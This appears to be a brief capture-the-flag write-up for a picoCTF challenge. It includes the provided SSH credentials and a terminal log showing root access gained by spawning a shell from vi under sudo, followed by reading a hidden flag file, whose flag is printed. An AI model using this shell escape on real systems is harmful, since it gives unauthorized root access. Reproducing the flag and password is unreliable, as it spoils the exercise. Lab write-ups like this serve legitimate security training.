
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 55858 picoplayer@saturn.picoctf.net`Password: `UYiOazkqY2`Can you login and read the root file?
# Descripción


# Solución 
```

picoplayer@challenge:~$ sudo vi -c ':!/bin/bash'
[sudo] password for picoplayer: 

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# cat /root/root.txt
cat: /root/root.txt: No such file or directory
root@challenge:/home/picoplayer# ls
root@challenge:/home/picoplayer# from 3.140.102.47
bash: from: command not found
root@challenge:/home/picoplayer# cd /root                         
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Feb 21 06:40 .
drwxr-xr-x 1 root root   75 Feb 21 06:34 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  643 Feb 21 06:40 .viminfo
root@challenge:~# cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_89e9cf1a}
root@challenge:~# 
```

## solución 2




# referencias

